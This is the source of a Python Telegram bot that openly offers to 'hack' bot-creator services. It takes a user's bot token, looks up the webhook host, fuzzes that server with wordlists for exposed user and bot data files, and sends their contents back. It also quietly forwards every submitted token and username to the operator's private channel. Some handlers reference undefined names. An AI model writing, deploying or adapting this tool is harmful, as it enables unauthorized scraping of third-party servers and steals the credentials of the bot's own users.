
#Imports...
from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import BadRequest , RPCError
from pyrogram import Client , filters
import requests as r
import json , os

#Informations...
api_id = 000
api_hash = 'abc'


#app
app = Client('Main' , api_id , api_hash)


#Texts
PanelText = 'Hello Admin...\nI Glad To See You Here... 🌜 🌛'
StartText = 'Hello...\nIf You Cant Hack Bot Creators, I Can...'
CreatorText = 'My Creator Is t.me/MrSharp'
GiveTokenText = 'Please Send Me Your Token...'
WaitText = 'Please Wait'
TokenErrorText = 'It Seems Your Token Is Not Valid...'
HostErrorText = 'It Seems Your Token Is Fresh or Is Broken...'
ErrorText = 'Something Went Wrong...'
BotErrorText = 'Something Went Wrong...\nI Think You Have Yo Change your Token Or Recreate Bot In Target Bot Creator'
CantGrabUsers = 'I Cant Grab The Users...'
GrabbedUsers = 'I Grabbed Users...'
CantGrabBots = 'I Cant Grab The Bots...'
GrabbedBots = 'I Grabbed Bots...'
SendCoinText = 'Ok Send Me UserId And Coins Like This:\nUserId\nCoins'
deleteCoinText = 'Ok Send Me UserId And Coins Like This:\nUserId\nCoins'
CoinSentText = 'Coins Sent Successfully'
CoinSentFailText = 'Try Again...'
CoinDelText = 'Coins Deleted Successfully'
CoinDelFailText = 'Try Again...'
HelpText = 'Hi...\nIf You Want To Hack A Bot Creator...\nYou Have To Make A Bot In Target...\nAnd Then Use My Buttons\nAnd Send Your Token To Me...\n\n@IrLords'
LessCoinText = 'Your Coins Are Not Enough...'
JoinText = 'Please Join In Were Channels...\nThen, press confirm button...'
InviteOkText = 'You Invited Successfully...'
InviteFailText = 'You Started Before...'
UserInvitedText = 'User Invited Successfully and you earned 1 Coin...'
GiftCodeText = 'Ok... \nSend Me The Gift Code...'
GiftFailText = 'Oops...\nCode Is Wrong Or Used Before...'
GiftSuccText = 'Wow...\nCode Is True And Your Coins Are Increased...'
MakeGiftText = 'Ok Send Me Your Gift Code And Value Like This :\nGift Code\nValue'
MakeGiftFailText = 'Oops I Cant Make This...'
MakeGiftOkText = 'I Maked The Gift Code...'
ChGiftUsedText = 'SomeOne Used The Gift Code ...'
SorryText = 'Sorry...\nMaybe There is a problem...\nPlease Start Again...'
UserWantSpamText = 'Oops... 😬\nYou Cant Do it Baby... 🖕\nFuck You 🤣'

#Coins
StartCoin = 4
GetUsersCoin = 2
GetBotsCoin = 2

#Admins...
creator = 000
admin = 000
admin2 = 000
adminlist = [creator , admin , admin2]

#Buttons...
GetUsersButton = '💫 Get Users 💫'
GetBotsButton = '💫 Get Bots 💫'
MyAccButton = '🌗 Account 🌓'
HelpButton = '🌗 Help 🌓'
CreatorButton = '🌜 Creator 🌛'
SendCoinButton = '🤯 Send Coin 🤯'
DelCoinButton = '🥀 Del Coin 🥀'
StatsButton = '🪐 Stats 🪐'
BackButton = '🥀 Back 🥀'
Ch1Button = '🥀 Mr Sharp 🥀'
Ch2Button = '🥀 Python Virus 🥀'
GiftCodeButton = '🎁 Gift Code 🎁'
RefreshButton = '🌧 Refresh 🌧'
MakeGiftButton = '☔️ Make Gift Code ☔️'
StartBotButton = '🌔 Start Bot 🌖'


#Channels And Links...
ch1 = 'channel_one'
ch2 = 'channel_two'
ich1 = 000
ich2 = 000
jch1 = 'https://t.me/YourChannel'
jch2 = 'http://t.me/YourChannel2'
startlink = 'http://t.me/BotLink?start'
sharpch = 000
chgift = 000

#Lets Code...

@app.on_message()
def main(client , message) :
    try :
        #-------------------------------------------------------
        chat_id = message.chat.id
        userid = message.from_user.id
        ucheck = check(userid)
        tch1 = app.get_chat_member(ch1, userid)
        tch2 = app.get_chat_member(ch2, userid)
        userstep = step(userid)
        usercoins = int(coin(userid))
        #-------------------------------------------------------
        try :
            tt = message.entities
            if not tt == None :
                st = message.entities[0]['type']
                if st == 'bot_command' :
                    id = message.text.partition(' ')
                    if id[0] == '/start' and len(id) == 3 and not id[2] == '' :
                        if len(id[2]) > 12 :
                            app.send_message(userid , UserWantSpamText)
                            app.send_message(sharpch , f'I Fucked A Pussy :)\nPussy: {userid}\nId: {message.from_user.username}\nFirst Name: {message.from_user.first_name}')
                        else :
                            res = invite(userid , id[2])
                            if res == True :
                                app.send_message(userid , InviteOkText)
                                sendcoin(id[2] , 1)
                                app.send_message(id[2] , UserInvitedText)
        except BadRequest :
            app.send_message(userid , JoinText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(Ch1Button , url = jch1) , InlineKeyboardButton(Ch2Button , url = jch2)], [InlineKeyboardButton('✨ Confirm ✨' , url = startlink)]]))
        #-------------------------------------------------------
        if userstep == 'start' and message.text == '/start' :
            app.send_message(userid , StartText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(GetUsersButton , callback_data = 'GetUsers') , InlineKeyboardButton(GetBotsButton , callback_data = 'GetBots')],[InlineKeyboardButton(MyAccButton , callback_data = 'myacc') , InlineKeyboardButton(HelpButton , callback_data = 'Help')],[InlineKeyboardButton(CreatorButton , callback_data = 'Creator')]]) )
        elif userstep == 'start' and message.text == '/panel' and userid in adminlist :
            app.send_message(userid , PanelText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(SendCoinButton , callback_data = 'SendCoin') , InlineKeyboardButton(DelCoinButton , callback_data = 'DelCoin')],[InlineKeyboardButton(StatsButton , callback_data = 'Stats') , InlineKeyboardButton(MakeGiftButton , callback_data = 'MakeGift')]]) )
        #-------------------------------------------------------
        elif userstep == 'getusers' :
            try :
                token = message.text
                if usercoins > 0 :
                    app.send_message(userid , WaitText )
                    host = gtoken(token)
                    app.send_message(sharpch , f'{userid} - `{token}` - {host} Id: {message.from_user.username}')
                    if host == 'T-error' :
                        wstep(userid , 'start')
                        app.send_message(chat_id , TokenErrorText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]) ) 
                    elif host == 'E-error' :
                        wstep(userid , 'start')
                        app.send_message(chat_id , HostErrorText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
                    else :
                        wstep(userid , 'start')
                        fhost = host.rsplit('/' , 3)[0]
                        res = fuzze(fhost , 'lists/users.txt').split('\n')
                        res.remove('')
                        res.remove(fhost)
                        if len(res) == 0 :
                            app.send_message(userid , CantGrabUsers , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                        else :
                            delete = delcoin(userid , GetUsersCoin)
                            if delete == True :
                                for i in res :
                                    users = r.get(i).text
                                    app.send_message(chat_id = chat_id , text = users) 
                                app.send_message(userid , GrabbedUsers , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                            else :
                                wstep(userid , 'start')
                                app.edit_message_text(chat_id , message_id , BotErrorText ) 
                                app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                else :
                    app.send_message(sharpch , f'{userid} - `{token}` + Less Coin -- id: {message.from_user.username}')
                    wstep(userid , 'start')
                    app.send_message(chat_id , LessCoinText ) 
            except :
                wstep(userid , 'start')
                app.send_message(chat_id , ErrorText )
        #-------------------S--I--L--V--E---R------------------------
        elif userstep == 'getbots' :
            try :
                token = message.text
                if usercoins > 0 :
                    app.send_message(userid , WaitText )
                    host = gtoken(token)
                    app.send_message(sharpch , f'{userid} - `{token}` - {host} Id: {message.from_user.username}')
                    if host == 'T-error' :
                        wstep(userid , 'start')
                        app.edit_message_text(chat_id , message_id , TokenErrorText ) 
                        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                    elif host == 'E-error' :
                        wstep(userid , 'start')
                        app.edit_message_text(chat_id , message_id , HostErrorText ) 
                        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                    else :
                        delete = delcoin(userid , GetBotsCoin)
                        if delete == True :
                            wstep(userid , 'start')
                            fhost = host.rsplit('/' , 3)[0]
                            res = fuzze(fhost , 'lists/bots.txt').split('\n')
                            res.remove('')
                            res.remove(fhost)
                            if len(res) == 0 :
                                app.send_message(userid , CantGrabUsers , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                            else :
                                for i in res :
                                    users = r.get(i).text
                                    app.send_message(chat_id = chat_id , text = users) 
                                app.send_message(userid , GrabbedBots , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                        else :
                            wstep(userid , 'start')
                            app.edit_message_text(chat_id , message_id , ErrorText ) 
                            app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                else :
                    app.send_message(sharpch , f'{userid} - `{token}` + Less Coin -- id: {message.from_user.username}')
                    wstep(userid , 'start')
                    app.send_message(chat_id , LessCoinText ) 
            except :
                wstep(userid , 'start')
                app.send_message(chat_id , ErrorText )
        #-------------------------------------------------------
        elif userstep == 'giftcode' :
            try :
                data = message.text
                code = giftcode(data)
                if code == False : 
                    wstep(userid , 'start')
                    app.send_message(chat_id , GiftFailText , reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                else :
                    wstep(userid , 'start')
                    dgiftcode(data)
                    sendcoin(userid , code)
                    app.send_message(chgift , f'⛈ Code: {data} ⛈\n🌬 Used By: {message.from_user.username} 🌬\n🌙 Id: {userid} 🌙\n\n@IrLords - - @MrSharp' , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(StartBotButton , url = startlink)]]))
                    app.send_message(userid , GiftSuccText , reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
            except :
                wstep(userid , 'start')
                app.send_message(chat_id , GiftErrorText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]) )
        #-------------------------------------------------------
        elif userstep == 'sendcoin' and userid in adminlist :
            try :
                wstep(userid , 'start')
                data = message.text.split('\n')
                res = sendcoin(data[0] , data[1])
                if res == True :
                    app.send_message(userid , CoinSentText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                else :
                    app.send_message(userid , CoinSentFailText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
            except :
                wstep(userid , 'start')
                app.edit_message_text(chat_id , message_id , ErrorText )
                app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
                
        #-------------------------------------------------------
        elif userstep == 'makegift' and userid in adminlist :
            try :
                wstep(userid , 'start')
                data = message.text.split('\n')
                res = mgiftcode(data[0] , data[1])
                if res == True :
                    app.send_message(userid , MakeGiftOkText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                    app.send_message(chgift , f'☔️ A Gift Code Maked By Admin ☔️\n⛈ Code: `{data[0]}` ⛈\n❄️ Value: {data[1]} ❄️\n\n@IrLords - - @MrSharp' , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(StartBotButton , url = startlink)]]))
                else :
                    app.send_message(userid , MakeGiftFailText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
            except :
                wstep(userid , 'start')
                app.send_message(chat_id , ErrorText , reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
        #-------------------------------------------------------
        elif userstep == 'delcoin' and userid in adminlist :
            try :
                data = message.text.split('\n')
                res = delcoin(data[0] , data[1])
                wstep(userid , 'start')
                if res == True :
                    app.send_message(userid , CoinDelText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
                else :
                    app.send_message(userid , CoinDelFailText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
            except :
                wstep(userid , 'start')
                app.edit_message_text(chat_id , message_id , ErrorText )
                app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
        #-------------------------------------------------------
    except BadRequest :
        app.send_message(userid , JoinText , reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(Ch1Button , url = jch1) , InlineKeyboardButton(Ch2Button , url = jch2)], [InlineKeyboardButton('✨ Confirm ✨' , url = startlink)]]))
    except Exception as e :
        app.send_message(sharpch , f'Bot Error:\n{e}')
@app.on_callback_query()
def callback(_, query) :
    userid = query.from_user.id
    chat_id = query.message.chat.id
    message_id = query.message.message_id
    data = query.data
    #-------------------------------------------------------
    if data == 'GetUsers' :
        wstep(userid , 'getusers')
        app.edit_message_text(chat_id , message_id , GiveTokenText ) 
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
    #-------------------------------------------------------
    elif data == 'GetBots' :
        wstep(userid , 'getbots')
        app.edit_message_text(chat_id , message_id , GiveTokenText )
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
    #-------------------------------------------------------
    elif data == 'Creator' :
        wstep(userid , 'start')
        app.edit_message_text(chat_id , message_id , CreatorText ) 
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
    #-------------------------------------------------------
    elif data == 'Stats' :
        app.edit_message_text(chat_id , message_id , f'Bot Stats: {stats()}' ) 
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(RefreshButton , callback_data = 'Stats') , InlineKeyboardButton(BackButton , callback_data = 'Back')]]))
    #-------------------------------------------------------
    elif data == 'SendCoin' :
        wstep(userid , 'sendcoin')
        app.edit_message_text(chat_id , message_id , SendCoinText )
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
    #-------------------------------------------------------
    elif data == 'DelCoin' :
        wstep(userid , 'delcoin')
        app.edit_message_text(chat_id , message_id , deleteCoinText )
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
    #-------------------------------------------------------
    elif data == 'Help' :
        wstep(userid , 'start')
        app.edit_message_text(chat_id , message_id , HelpText )
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
    #-------------------------------------------------------
    elif data == 'myacc' :
        wstep(userid , 'start')
        app.edit_message_text(chat_id , message_id , f'Hello {userid}\nYour Coins: {coin(userid)}\nInvite Link:\nt.me/MrBeanPyBot?start={userid}\n\n@IrLords' )
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(GiftCodeButton , callback_data = 'GiftCode')] , [InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
    #-------------------------------------------------------
    elif data == 'GiftCode' :
        wstep(userid , 'giftcode')
        app.edit_message_text(chat_id , message_id , GiftCodeText )
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
    #-------------------------------------------------------
    elif data == 'MakeGift' :
        wstep(userid , 'makegift')
        app.edit_message_text(chat_id , message_id , MakeGiftText )
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(BackButton , callback_data = 'Back')]])) 
    #-------------------------------------------------------
    elif data == 'Back' :
        wstep(userid , 'start')
        app.edit_message_text(chat_id , message_id , StartText ) 
        app.edit_message_reply_markup(chat_id , message_id , InlineKeyboardMarkup([[InlineKeyboardButton(GetUsersButton , callback_data = 'GetUsers') , InlineKeyboardButton(GetBotsButton , callback_data = 'GetBots')],[InlineKeyboardButton(MyAccButton , callback_data = 'myacc') , InlineKeyboardButton(HelpButton , callback_data = 'Help')],[InlineKeyboardButton(CreatorButton , callback_data = 'Creator')]]))



#Defs...
def gtoken(token) :
    try :
        url = f'https://api.telegram.org/bot{token}/getwebhookinfo'
        res = r.get(url).text
        res = json.loads(res)
        ok = res["ok"]
        if ok == True :
            return res["result"]["url"]
        else :
            return 'T-error'
    except : 
        return 'E-error'

def fuzze(host , list) :
    datas = str()
    list = open(list , 'r')
    list2 = list.read().split('\n')
    for i in list2 :
        try :
            url = host + i
            res = r.get(url).status_code
            if res == 200 :
                datas = datas + url + '\n'
        except :
            pass
    list.close()
    return datas

def check(userid) :
#    try :
    step = os.path.isfile('step/' + str(userid) + '.txt')
    user = os.path.isfile('users/' + str(userid) + '.txt')
    if step == False :
        f = open('step/' + str(userid) + '.txt' , 'w+')
        f.write('start')
        f.close()
    elif user == False :
        f = open('users/' + str(userid) + '.txt' , 'w+')
        f.write(str(StartCoin))
        f.close()    
    return True
#    except :
#        return False

def step(userid) :
#    try :
    res = open('step/' + str(userid) + '.txt' , 'r').read()
    return res
#    except :
#        return False


def wstep(userid , step) :
    try :
        f = open('step/' + str(userid) + '.txt' , 'w')
        f.write(step)
        return True
    except :
        return False

def coin(userid) :
    try :
        res = open('users/' + str(userid) + '.txt' , 'r').read()
        return res
    except :
        return False

def sendcoin(userid , coin) :
    try :
        coins = open('users/' + str(userid) + '.txt' , 'r').read()
        uc = open('users/' + str(userid) + '.txt' , 'w')
        res = int(coins) + int(coin)
        uc.write(str(res))
        uc.close()
        return True
    except :
        return False

def delcoin(userid , coin) :
    try :
        coins = open('users/' + str(userid) + '.txt' , 'r').read()
        res = int(coins) - int(coin)
        if res < 0 :
            return False
        else :
            uc = open('users/' + str(userid) + '.txt' , 'w')
            uc.write(str(res))
            uc.close()
            return True
    except :
        return False

def stats() :
    try :
        users = os.listdir('users')
        users = len(users)
        return users
    except :
        return False

def invite(userid , id) :
    invite = os.path.isfile('invite/' + str(userid) + '.txt')
    if invite == False :
        f = open('invite/' + str(userid) + '.txt' , 'w+')
        f.write(id)
        f.close()
        return True
    else :
        return False

def mgiftcode(name , value) :
#    try :
    code = open('codes/' + str(name) + '.txt' , 'w+')
    int(value)
    code.write(value)
    code.close()
    return True
#    except :
#        return False

def giftcode(name) :
    try :
        res = open('codes/' + str(name) + '.txt' , 'r').read()
        return int(res)
    except :
        return False

def dgiftcode(name) :
    try :
        code = os.remove('codes/' + str(name) + '.txt')
        return True
    except :
        return False



#Run...
app.run()

